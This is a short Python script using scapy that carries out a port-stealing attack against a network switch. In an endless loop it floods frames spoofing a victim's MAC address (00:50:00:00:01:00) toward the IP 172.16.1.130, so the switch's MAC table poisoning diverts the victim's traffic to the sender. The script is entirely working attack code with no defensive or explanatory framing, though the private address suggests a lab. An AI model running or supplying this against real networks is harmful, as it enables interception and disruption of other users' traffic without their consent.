from scapy.all import *
import time

def port_stealing(mac_target, ip_target):
    attack_packet = Ether(src=mac_target, dst=RandMAC()) / IP(src=RandIP(),dst=ip_target)
    return attack_packet

try:
    while True:
        victim_ip="172.16.1.130"
        victim_mac = "00:50:00:00:01:00"
        sendp(port_stealing(victim_mac, victim_ip))
        # time.sleep(0.1)
except KeyboardInterrupt:
    quit()


